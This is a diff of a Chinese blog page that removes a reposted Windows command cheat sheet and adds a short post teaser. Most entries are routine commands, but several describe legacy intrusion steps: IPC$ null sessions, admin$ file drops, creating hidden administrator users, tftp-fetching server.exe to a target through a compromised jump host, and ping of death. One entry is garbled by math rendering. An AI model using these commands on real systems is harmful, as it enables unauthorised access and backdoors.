-**<br />
-访问迭代器指向元素时使用  *名称<br />
-cout&lt;&lt;*it&lt;&lt;endl;</p>
-<p>迭代器只能自增<code>++it</code>;，不能+1或者-1或者其他操作</p>
-<p></p>
-
+      记录集合的用法和相关接口。
+      
+        <div class="readmore">
+          <a href="/archives/fcc57c4c.html" class="flat-box">
+            <i class="fas fa-book-open fa-fw" aria-hidden="true"></i>
+            阅读全文
+          </a>
+        </div>
       
     </div>
     
@@ -1425,9 +1035,9 @@ cout&lt;&lt;*it&lt;&lt;endl;</p>
             
   
   <div class='new-meta-item category'>
-    <a href='/categories/%E5%AE%9E%E7%94%A8%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/' rel="nofollow">
+    <a href='/categories/%E6%8A%80%E6%9C%AF%E7%BB%8F%E9%AA%8C/' rel="nofollow">
       <i class="fas fa-folder-open" aria-hidden="true"></i>
-      <p>实用工具汇总</p>
+      <p>技术经验</p>
     </a>
   </div>
 
@@ -1454,1486 +1064,224 @@ cout&lt;&lt;*it&lt;&lt;endl;</p>
 
   <section class="article typo">
     <div class="article-entry" itemprop="articleBody">
-      <blockquote>
-<p>转载：<a href="https://www.jb51.net/article/141568.htm" target="_blank" rel="noopener">https://www.jb51.net/article/141568.htm</a></p>
-</blockquote>
-<h1 id="常用命令"><a class="markdownIt-Anchor" href="#常用命令"></a> 常用命令：</h1>
-<ul>
-<li>直接输入盘符就可以进入相应盘，如：e:</li>
-<li>cd: 进入文件夹</li>
-<li>md: 创建文件夹</li>
-<li>type nul&gt;: 创建空文件</li>
-<li>echo “内容”&gt;: 创建带内容的文件</li>
-<li>type: 查看文件内容</li>
-<li>dir: 列出文件</li>
-<li>rd: 删除空文件夹</li>
-<li>rd /s/q: 删除文件及其子文件夹，包括有内容的文件</li>
-<li>del: 删除文件</li>
-</ul>
-<p>在DOS窗口下使用命令 help：</p>
-<ul>
-<li>ASSOC          显示或修改文件扩展名关联。</li>
-<li>ATTRIB         显示或更改文件属性。</li>
-<li>BREAK          设置或清除扩展式 CTRL+C 检查。</li>
-<li>BCDEDIT        设置启动数据库中的属性以控制启动加载。</li>
-<li>CACLS          显示或修改文件的访问控制列表(ACL)。</li>
-<li>CALL           从另一个批处理程序调用这一个。</li>
-<li>CD             显示当前目录的名称或将其更改。</li>
-<li>CHCP           显示或设置活动代码页数。</li>
-<li>CHDIR          显示当前目录的名称或将其更改。</li>
-<li>CHKDSK         检查磁盘并显示状态报告。</li>
-<li>CHKNTFS        显示或修改启动时间磁盘检查。</li>
-<li>CLS            清除屏幕。</li>
-<li>CMD            打开另一个 Windows 命令解释程序窗口。</li>
-<li>COLOR          设置默认控制台前景和背景颜色。</li>
-<li>COMP           比较两个或两套文件的内容。</li>
-<li>COMPACT        显示或更改 NTFS 分区上文件的压缩。</li>
-<li>CONVERT        将 FAT 卷转换成 NTFS。您不能转换当前驱动器。</li>
-<li>COPY           将至少一个文件复制到另一个位置。</li>
-<li>DATE           显示或设置日期。</li>
-<li>DEL            删除至少一个文件。</li>
-<li>DIR            显示一个目录中的文件和子目录。</li>
-<li>DISKCOMP       比较两个软盘的内容。</li>
-<li>DISKCOPY       将一个软盘的内容复制到另一个软盘。</li>
-<li>DISKPART       显示或配置磁盘分区属性。</li>
-<li>DOSKEY         编辑命令行、调用 Windows 命令并创建宏。</li>
-<li>DRIVERQUERY    显示当前设备驱动程序状态和属性。</li>
-<li>ECHO           显示消息，或将命令回显打开或关上。</li>
-<li>ENDLOCAL       结束批文件中环境更改的本地化。</li>
-<li>ERASE          删除一个或多个文件。</li>
-<li>EXIT           退出 CMD.EXE 程序(命令解释程序)。</li>
-<li>FC             比较两个文件或两个文件集并显示它们之间的不同。</li>
-<li>FIND           在一个或多个文件中搜索一个文本字符串。</li>
-<li>FINDSTR        在多个文件中搜索字符串。</li>
-<li>FOR            为一套文件中的每个文件运行一个指定的命令。</li>
-<li>FORMAT         格式化磁盘，以便跟 Windows 使用。</li>
-<li>FSUTIL         显示或配置文件系统的属性。</li>
-<li>FTYPE          显示或修改用在文件扩展名关联的文件类型。</li>
-<li>GOTO           将 Windows 命令解释程序指向批处理程序中某个带标签的行。</li>
-<li>GPRESULT       显示机器或用户的组策略信息。</li>
-<li>GRAFTABL       启用 Windows 在图形模式显示扩展字符集。</li>
-<li>HELP           提供 Windows 命令的帮助信息。</li>
-<li>ICACLS         显示、修改、备份或还原文件和目录的 ACL。</li>
-<li>IF             在批处理程序中执行有条件的处理过程。</li>
-<li>LABEL          创建、更改或删除磁盘的卷标。</li>
-<li>MD             创建一个目录。</li>
-<li>MKDIR          创建一个目录。</li>
-<li>MKLINK         创建符号链接和硬链接</li>
-<li>MODE           配置系统设备。</li>
-<li>MORE           逐屏显示输出。</li>
-<li>MOVE           将一个或多个文件从一个目录移动到另一个目录。</li>
-<li>OPENFILES      显示远程用户为了文件共享而打开的文件。</li>
-<li>PATH           为可执行文件显示或设置搜索路径。</li>
-<li>PAUSE          停止批处理文件的处理并显示信息。</li>
-<li>POPD           还原由 PUSHD 保存的当前目录上一次的值。</li>
-<li>PRINT          打印一个文本文件。</li>
-<li>PROMPT         改变 Windows 命令提示。</li>
-<li>PUSHD          保存当前目录，然后对其进行更改。</li>
-<li>RD             删除目录。</li>
-<li>RECOVER        从损坏的磁盘中恢复可读取的信息。</li>
-<li>REM            记录批处理文件或 CONFIG.SYS 中的注释。</li>
-<li>REN            重新命名文件。</li>
-<li>RENAME         重新命名文件。</li>
-<li>REPLACE        替换文件。</li>
-<li>RMDIR          删除目录。</li>
-<li>ROBOCOPY       复制文件和目录树的高级实用程序</li>
-<li>SET            显示、设置或删除 Windows 环境变量。</li>
-<li>SETLOCAL       开始用批文件改变环境的本地化。</li>
-<li>SC             显示或配置服务(后台处理)。</li>
-<li>SCHTASKS       安排命令和程序在一部计算机上按计划运行。</li>
-<li>SHIFT          调整批处理文件中可替换参数的位置。</li>
-<li>SHUTDOWN       让机器在本地或远程正确关闭。</li>
-<li>SORT           将输入排序。</li>
-<li>START          打开单独视窗运行指定程序或命令。</li>
-<li>SUBST          将驱动器号与路径关联。</li>
-<li>SYSTEMINFO     显示机器的具体的属性和配置。</li>
-<li>TASKLIST       显示包括服务的所有当前运行的任务。</li>
-<li>TASKKILL       终止正在运行的进程或应用程序。</li>
-<li>TIME           显示或设置系统时间。</li>
-<li>TITLE          设置 CMD.EXE 会话的窗口标题。</li>
-<li>TREE           以图形显示启动器或路径的目录结构。</li>
-<li>TYPE           显示文本文件的内容。</li>
-<li>VER            显示 Windows 的版本。</li>
-<li>VERIFY         告诉 Windows 验证文件是否正确写入磁盘。</li>
-<li>VOL            显示磁盘卷标和序列号。</li>
-<li>XCOPY          复制文件和目录树。</li>
-<li>WMIC           在交互命令外壳里显示 WMI 信息。</li>
-</ul>
-<h1 id="查询表"><a class="markdownIt-Anchor" href="#查询表"></a> 查询表：</h1>
-<hr />
-<ul>
-<li>
-<p>net use ipipc$ &quot; &quot; /user:&quot; &quot; 建立IPC空链接</p>
-</li>
-<li>
-<p>net use ipipc$ “密码” /user:“用户名” 建立IPC非空链接</p>
-</li>
-<li>
-<p>net use h: ipc$ “密码” /user:“用户名” 直接登陆后映射对方C：到本地为H:</p>
-</li>
-<li>
-<p>net use h: ipc$ 登陆后映射对方C：到本地为H:</p>
-</li>
-<li>
-<p>net use ipipc$ /del 删除IPC链接</p>
-</li>
-<li>
-<p>net use h: /del 删除映射对方到本地的为H:的映射</p>
-</li>
-<li>
-<p>net user 用户名　密码　/add 建立用户</p>
-</li>
-<li>
-<p>net user guest /active:yes 激活guest用户</p>
-</li>
-<li>
-<p>net user 查看有哪些用户</p>
-</li>
-<li>
-<p>net user 帐户名 查看帐户的属性</p>
-</li>
-<li>
-<p>net localgroup administrators 用户名 /add 把“用户”添加到管理员中使其具有管理员权限</p>
-</li>
-<li>
-<p>net start 查看开启了哪些服务</p>
-</li>
-<li>
-<p>net start 服务名　开启服务；(如:net start telnet， net start schedule)</p>
-</li>
-<li>
-<p>net stop 服务名 停止某服务</p>
-</li>
-<li>
-<p>net time 目标ip 查看对方时间</p>
-</li>
-<li>
-<p>net time 目标ip /set 设置本地计算机时间与“目标IP”主机的时间同步,加上参数/yes可取消确认信息</p>
-</li>
-<li>
-<p>net view 查看本地局域网内开启了哪些共享</p>
-</li>
-<li>
-<p>net view ip 查看对方局域网内开启了哪些共享</p>
-</li>
-<li>
-<p>net config 显示系统网络设置</p>
-</li>
-<li>
-<p>net logoff 断开连接的共享</p>
-</li>
-<li>
-<p>net pause 服务名 暂停某服务</p>
-</li>
-<li>
-<p>net send ip “文本信息” 向对方发信息</p>
-</li>
-<li>
-<p>net ver 局域网内正在使用的网络连接类型和信息</p>
-</li>
-<li>
-<p>net share 查看本地开启的共享</p>
-</li>
-<li>
-<p>net share ipc$ 开启ipc$共享</p>
-</li>
-<li>
-<p>net share ipc$ /del 删除ipc$共享</p>
-</li>
-<li>
-<p>net share c$ /del 删除C：共享</p>
-</li>
-<li>
-<p>net user guest 12345 用guest用户登陆后用将密码改为12345</p>
-</li>
-<li>
-<p>net password 密码 更改系统登陆密码</p>
-</li>
-<li>
-<p>netstat -a 查看开启了哪些端口,常用netstat -an</p>
-</li>
-<li>
-<p>netstat -n 查看端口的网络连接情况，常用netstat -an</p>
-</li>
-<li>
-<p>netstat -v 查看正在进行的工作</p>
-</li>
-<li>
-<p>netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况</p>
-</li>
-<li>
-<p>netstat -s 查看正在使用的所有协议使用情况</p>
-</li>
-<li>
-<p>nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名</p>
-</li>
-<li>
-<p>tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。</p>
-</li>
-<li>
-<p>ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。</p>
-</li>
-<li>
-<p>ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping)</p>
-</li>
-<li>
-<p>ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息</p>
-</li>
-<li>
-<p>tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)</p>
-</li>
-<li>
-<p>kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)</p>
-</li>
-<li>
-<p>del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR <em>.</em>”表示删除当前目录下所有只读文件，“DEL/A-S <em>.</em>”表示删除当前目录下除系统文件以外的所有文件</p>
-</li>
-<li>
-<p>del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同）</p>
-</li>
-<li>
-<p>move 盘符路径要移动的文件名　存放移动文件的路径移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖</p>
-</li>
-<li>
-<p>fc one.txt two.txt &gt; 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，&quot;&gt; “和”&gt; &gt;&quot; 是重定向命令</p>
-</li>
-<li>
-<p>at id号 开启已注册的某个计划任务</p>
-</li>
-<li>
-<p>at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止</p>
-</li>
-<li>
-<p>at id号 /delete 停止某个已注册的计划任务</p>
-</li>
-<li>
-<p>at 查看所有的计划任务</p>
-</li>
-<li>
-<p>at ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机</p>
-</li>
-<li>
-<p>finger username @host 查看最近有哪些用户登陆</p>
-</li>
-<li>
-<p>telnet ip 端口 远和登陆服务器,默认端口为23</p>
-</li>
-<li>
-<p>open ip 连接到IP（属telnet登陆后的命令）</p>
-</li>
-<li>
-<p>telnet 在本机上直接键入telnet 将进入本机的telnet</p>
-</li>
-<li>
-<p>copy 路径文件名1　路径文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件</p>
-</li>
-<li>
-<p>copy c:srv.exe ipadmin$ 复制本地c:srv.exe到对方的admin下</p>
-</li>
-<li>
-<p>copy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件</p>
-</li>
-<li>
-<p>copy ipadmin<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi>v</mi><mi>v</mi><mi mathvariant="normal">.</mi><mi>e</mi><mi>x</mi><mi>e</mi><mi>c</mi><mo>:</mo><mi mathvariant="normal">或</mi><mo>:</mo><mi>c</mi><mi>o</mi><mi>p</mi><mi>y</mi><mi>i</mi><mi>p</mi><mi>a</mi><mi>d</mi><mi>m</mi><mi>i</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">svv.exe c: 或:copyipadmin</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord">.</span><span class="mord mathdefault">e</span><span class="mord mathdefault">x</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord cjk_fallback">或</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">i</span><span class="mord mathdefault">p</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">m</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span></span></span></span><em>.</em> 复制对方admini$共享下的srv.exe文件（所有文件）至本地C：</p>
-</li>
-<li>
-<p>xcopy 要复制的文件或目录树　目标地址目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件</p>
-</li>
-<li>
-<p>用参数/e才可连目录下的子目录一起复制到目标地址下。</p>
-</li>
-<li>
-<p>tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exe c:server.exe 登陆后，将“IP”的server.exe下载到目标主机c:server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送</p>
-</li>
-<li>
-<p>tftp -i 对方IP　put c:server.exe 登陆后，上传本地c:server.exe至主机</p>
-</li>
-<li>
-<p>ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时)</p>
-</li>
-<li>
-<p>route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface</p>
-</li>
-<li>
-<p>arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息</p>
-</li>
-<li>
-<p>start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令</p>
-</li>
-<li>
-<p>mem 查看cpu使用情况</p>
-</li>
-<li>
-<p>attrib 文件名(目录名) 查看某文件（目录）的属性</p>
-</li>
-<li>
-<p>attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用+则是添加为某属性</p>
-</li>
-<li>
-<p>dir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间</p>
-</li>
-<li>
-<p>date /t 、 time /t 使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和时间，而不必输入新日期和时间</p>
-</li>
-<li>
-<p>set 指定环境变量名称=要指派给变量的字符 设置环境变量</p>
-</li>
-<li>
-<p>set 显示当前所有的环境变量</p>
-</li>
-<li>
-<p>set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量</p>
-</li>
-<li>
-<p>pause 暂停批处理程序，并显示出：请按任意键继续…</p>
-</li>
-<li>
-<p>if 在批处理程序中执行条件处理（更多说明见if命令及变量）</p>
-</li>
-<li>
-<p>goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签）</p>
-</li>
-<li>
-<p>call 路径批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?）</p>
-</li>
-<li>
-<p>for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量）</p>
-</li>
-<li>
-<p>echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置</p>
-</li>
-<li>
-<p>echo 信息 在屏幕上显示出信息</p>
-</li>
-<li>
-<p>echo 信息 &gt;&gt; pass.txt 将&quot;信息&quot;保存到pass.txt文件中</p>
-</li>
-<li>
-<p>findstr “Hello” aa.txt 在aa.txt文件中寻找字符串hello</p>
-</li>
-<li>
-<p>find 文件名 查找某文件</p>
-</li>
-<li>
-<p>title 标题名字 更改CMD窗口标题名字</p>
-</li>
-<li>
-<p>color 颜色值 设置cmd控制台前景和背景颜色；0=黑、1=蓝、2=绿、3=浅绿、4=红、5=紫、6=黄、7=白、8=灰、9=淡蓝、A=淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白</p>
-</li>
-<li>
-<p>prompt 名称 更改cmd.exe的显示的命令提示符(把C:、D:统一改为：EntSky )</p>
-</li>
-<li>
-<p>ver 在DOS窗口下显示版本信息</p>
-</li>
-<li>
-<p>winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名）</p>
-</li>
-<li>
-<p>format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS</p>
-</li>
-<li>
-<p>md　目录名 创建目录</p>
-</li>
-<li>
-<p>replace 源文件　要替换文件的目录 替换文件</p>
-</li>
-<li>
-<p>ren 原文件名　新文件名 重命名文件名</p>
-</li>
-<li>
-<p>tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称</p>
-</li>
-<li>
-<p>type 文件名 显示文本文件的内容</p>
-</li>
-<li>
-<p>more 文件名 逐屏显示输出文件</p>
-</li>
-<li>
-<p>doskey 要锁定的命令=字符</p>
-</li>
-<li>
-<p>doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；解锁：doskey dir=</p>
-</li>
-<li>
-<p>taskmgr 调出任务管理器</p>
-</li>
-<li>
-<p>chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误</p>
-</li>
-<li>
-<p>tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口</p>
-</li>
-<li>
-<p>exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe</p>
-</li>
-<li>
-<p>path 路径可执行文件的文件名 为可执行文件设置一个路径。</p>
-</li>
-<li>
-<p>cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /?</p>
-</li>
-<li>
-<p>regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示；</p>
-</li>
-<li>
-<p>regedit /e 注册表文件名 导出注册表</p>
-</li>
-<li>
-<p>cacls 文件名　参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D: est.txt /D pub 设定d: est.txt拒绝pub用户访问。</p>
-</li>
-<li>
-<p>cacls 文件名 查看文件的访问用户权限列表</p>
-</li>
-<li>
-<p>REM 文本内容 在批处理文件中添加注解</p>
-</li>
-<li>
-<p>netsh 查看或更改本地网络配置情况</p>
-</li>
-<li>
-<p>IIS服务命令</p>
-</li>
-<li>
-<p>iisreset /reboot 重启win2k计算机（但有提示系统将重启信息出现）</p>
-</li>
-<li>
-<p>iisreset /start或stop 启动（停止）所有Internet服务</p>
-</li>
-<li>
-<p>iisreset /restart 停止然后重新启动所有Internet服务</p>
-</li>
-<li>
-<p>iisreset /status 显示所有Internet服务状态</p>
-</li>
-<li>
-<p>iisreset /enable或disable 在本地系统上启用（禁用）Internet服务的重新启动</p>
-</li>
-<li>
-<p>iisreset /rebootonerror 当启动、停止或重新启动Internet服务时，若发生错误将重新开机</p>
-</li>
-<li>
-<p>iisreset /noforce 若无法停止Internet服务，将不会强制终止Internet服务</p>
-</li>
-<li>
-<p>iisreset /timeout Val在到达逾时间（秒）时，仍未停止Internet服务，若指定/rebootonerror参数，则电脑将会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。</p>
-</li>
-<li>
-<p>FTP 命令： (后面有详细说明内容)</p>
-</li>
-<li>
-<p>ftp的命令行格式为:</p>
-</li>
-<li>
-<p>ftp －v －d －i －n －g[主机名] －v 显示远程服务器的所有响应信息。</p>
-</li>
-<li>
-<p>－d 使用调试方式。</p>
-</li>
-<li>
-<p>－n 限制ftp的自动登录,即不使用.netrc文件。</p>
-</li>
-<li>
-<p>－g 取消全局文件名。</p>
-</li>
-<li>
-<p>help [命令] 或 ？[命令] 查看命令说明</p>
-</li>
-<li>
-<p>bye 或 quit 终止主机FTP进程,并退出FTP管理方式.</p>
-</li>
-<li>
-<p>pwd 列出当前远端主机目录</p>
-</li>
-<li>
-<p>put 或 send 本地文件名 [上传到主机上的文件名] 将本地一个文件传送至远端主机中</p>
-</li>
-<li>
-<p>get 或 recv [远程主机文件名] [下载到本地后的文件名] 从远端主机中传送至本地主机中</p>
-</li>
-<li>
-<p>mget [remote-files] 从远端主机接收一批文件至本地主机</p>
-</li>
-<li>
-<p>mput local-files 将本地主机中一批文件传送至远端主机</p>
-</li>
-<li>
-<p>dir 或 ls [remote-directory] [local-file] 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本地文件</p>
-</li>
-<li>
-<p>ascii 设定以ASCII方式传送文件(缺省值)</p>
-</li>
-<li>
-<p>bin 或 image 设定以二进制方式传送文件</p>
-</li>
-<li>
-<p>bell 每完成一次文件传送,报警提示</p>
-</li>
-<li>
-<p>cdup 返回上一级目录</p>
-</li>
-<li>
-<p>close 中断与远程服务器的ftp会话(与open对应)</p>
-</li>
-<li>
-<p>open host[port] 建立指定ftp服务器连接,可指定连接端口</p>
-</li>
-<li>
-<p>delete 删除远端主机中的文件</p>
-</li>
-<li>
-<p>mdelete [remote-files] 删除一批文件</p>
-</li>
-<li>
-<p>mkdir directory-name 在远端主机中建立目录</p>
-</li>
-<li>
-<p>rename [from] [to] 改变远端主机中的文件名</p>
-</li>
-<li>
-<p>rmdir directory-name 删除远端主机中的目录</p>
-</li>
-<li>
-<p>status 显示当前FTP的状态</p>
-</li>
-<li>
-<p>system 显示远端主机系统类型</p>
-</li>
-<li>
-<p>user user-name [password] [account] 重新以别的用户名登录远端主机</p>
-</li>
-<li>
-<p>open host [port] 重新建立一个新的连接</p>
-</li>
-<li>
-<p>prompt 交互提示模式</p>
-</li>
-<li>
-<p>macdef 定义宏命令</p>
-</li>
-<li>
-<p>lcd 改变当前本地主机的工作目录,如果缺省,就转到当前用户的HOME目录</p>
-</li>
-<li>
-<p>chmod 改变远端主机的文件权限</p>
-</li>
-<li>
-<p>case 当为ON时,用MGET命令拷贝的文件名到本地机器中,全部转换为小写字母</p>
-</li>
-<li>
-<p>cd remote－dir 进入远程主机目录</p>
-</li>
-<li>
-<p>cdup 进入远程主机目录的父目录</p>
-</li>
-<li>
-<p>! 在本地机中执行交互shell，exit回到ftp环境,如!ls*.zip</p>
-</li>
-<li>
-<p>#5</p>
-</li>
-<li>
-<p>MYSQL 命令</p>
-</li>
-<li>
-<p>mysql -h主机地址 -u用户名 －p密码 连接MYSQL;如果刚安装好MYSQL，超级用户root是没有密码的。</p>
-</li>
-<li>
-<p>（例：mysql -h110.110.110.110 -Uroot -P123456</p>
-</li>
-<li>
-<p>注:u与root可以不用加空格，其它也一样）</p>
-</li>
-<li>
-<p>exit 退出MYSQL</p>
-</li>
-<li>
-<p>mysqladmin -u用户名 -p旧密码 password 新密码 修改密码</p>
-</li>
-<li>
-<p>grant select on 数据库.* to 用户名@登录主机 identified by “密码”; 增加新用户。（注意：和上面不同，下面的因为是MYSQL环境中的命令，所以后面都带一个分号作为命令结束符）</p>
-</li>
-<li>
-<p>show databases; 显示数据库列表。刚开始时才两个数据库：mysql和test。mysql库很重要它里面有MYSQL的系统信息，我们改密码和新增用户，实际上就是用这个库进行操作。</p>
-</li>
-<li>
-<p>use mysql；</p>
-</li>
-<li>
-<p>show tables; 显示库中的数据表</p>
-</li>
-<li>
-<p>describe 表名; 显示数据表的结构</p>
-</li>
-<li>
-<p>create database 库名; 建库</p>
-</li>
-<li>
-<p>use 库名；</p>
-</li>
-<li>
-<p>create table 表名 (字段设定列表)； 建表</p>
-</li>
-<li>
-<p>drop database 库名;</p>
-</li>
-<li>
-<p>drop table 表名； 删库和删表</p>
-</li>
-<li>
-<p>delete from 表名; 将表中记录清空</p>
-</li>
-<li>
-<p>select * from 表名; 显示表中的记录</p>
-</li>
-<li>
-<p>mysqldump --opt school&gt;school.bbb 备份数据库：（命令在DOS的mysqlin目录下执行）;注释:将数据库school备份到school.bbb文件，school.bbb是一个文本文件，文件名任取，打开看看你会有新发现。</p>
-</li>
-<li>
-<p>win2003系统下新增命令（实用部份）：</p>
-</li>
-<li>
-<p>shutdown /参数 关闭或重启本地或远程主机。</p>
-</li>
-<li>
-<p>参数说明：/S 关闭主机，/R 重启主机， /T 数字 设定延时的时间，范围0～180秒之间， /A取消开机，/M //IP 指定的远程主机。</p>
-</li>
-<li>
-<p>例：shutdown /r /t 0 立即重启本地主机（无延时）</p>
-</li>
-<li>
-<p>taskill /参数 进程名或进程的pid 终止一个或多个任务和进程。</p>
-</li>
-<li>
-<p>参数说明：/PID 要终止进程的pid,可用tasklist命令获得各进程的pid，/IM 要终止的进程的进程名，/F 强制终止进程，/T 终止指定的进程及他所启动的子进程。</p>
-</li>
-<li>
-<p>tasklist 显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID)。</p>
-</li>
-<li>
-<p>参数说明：/M 列出当前进程加载的dll文件，/SVC 显示出每个进程对应的服务，无参数时就只列出当前的进程。</p>
-</li>
-<li>
-<p>Linux系统下基本命令　注：要区分大小写</p>
-</li>
-<li>
-<p>uname 显示版本信息（同win2K的 ver）</p>
-</li>
-<li>
-<p>dir 显示当前目录文件,ls -al 显示包括隐藏文件（同win2K的 dir）</p>
-</li>
-<li>
-<p>pwd 查询当前所在的目录位置</p>
-</li>
-<li>
-<p>cd cd　…回到上一层目录，注意cd 与…之间有空格。cd　/返回到根目录。</p>
-</li>
-<li>
-<p>cat 文件名 查看文件内容</p>
-</li>
-<li>
-<p>cat &gt;abc.txt 往abc.txt文件中写上内容。</p>
-</li>
-<li>
-<p>more 文件名 以一页一页的方式显示一个文本文件。</p>
-</li>
-<li>
-<p>cp 复制文件</p>
-</li>
-<li>
-<p>mv 移动文件</p>
-</li>
-<li>
-<p>rm 文件名 删除文件，rm -a 目录名删除目录及子目录</p>
-</li>
-<li>
-<p>mkdir 目录名 建立目录</p>
-</li>
-<li>
-<p>rmdir 删除子目录，目录内没有文档。</p>
-</li>
-<li>
-<p>chmod 设定档案或目录的存取权限</p>
-</li>
-<li>
-<p>grep 在档案中查找字符串</p>
-</li>
-<li>
-<p>diff 档案文件比较</p>
-</li>
-<li>
-<p>find 档案搜寻</p>
-</li>
-<li>
-<p>date 现在的日期、时间</p>
-</li>
-<li>
-<p>who 查询目前和你使用同一台机器的人以及Login时间地点</p>
-</li>
-<li>
-<p>w 查询目前上机者的详细资料</p>
-</li>
-<li>
-<p>whoami 查看自己的帐号名称</p>
-</li>
-<li>
-<p>groups 查看某人的Group</p>
-</li>
-<li>
-<p>passwd 更改密码</p>
-</li>
-<li>
-<p>history 查看自己下过的命令</p>
-</li>
-<li>
-<p>ps 显示进程状态</p>
-</li>
-<li>
-<p>kill 停止某进程</p>
-</li>
-<li>
-<p>gcc 黑客通常用它来编译C语言写的文件</p>
-</li>
-<li>
-<p>su 权限转换为指定使用者</p>
-</li>
-<li>
-<p>telnet IP telnet连接对方主机（同win2K），当出现bash$时就说明连接成功。</p>
-</li>
-<li>
-<p>ftp ftp连接上某服务器（同win2K）</p>
-</li>
-<li>
-<p>批处理命令与变量</p>
-</li>
-<li>
-<p>1：for命令及变量 基本格式</p>
-</li>
-<li>
-<p>FOR /参数 %variable IN (set) DO command [command_parameters] %variable:指定一个单一字母可替换的参数，如：%i ，而指定一个变量则用：%%i ，而调用变量时用：%i% ，变量是区分大小写的（%i 不等于 %I）。</p>
-</li>
-<li>
